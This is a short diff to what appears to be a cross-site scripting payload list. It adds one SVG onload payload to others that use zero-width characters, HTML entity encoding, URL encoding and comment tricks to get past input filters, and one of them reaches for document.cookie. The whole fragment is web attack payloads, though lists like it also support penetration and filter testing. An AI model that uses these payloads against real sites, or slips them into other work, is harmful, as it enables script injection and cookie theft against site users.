@@ -9,6 +9,7 @@ xss"*alert(document.cookie)*"
 <Svg+On+Only=1+0nload=alert(1)>
 <svg/onload​=prompt(1)>
 <Svg+On+Only=1+0nload=alert("hex")>
+<Svg+On+Only=1+0nload=confirm(1)>
 <svg/onload​=alert&#x2F;**&#47;(5)>
 <svg%20onload=prompt%26%230000000040document.domain)>
 <svg/onload​=alert/&#42;&#42;/(4)>
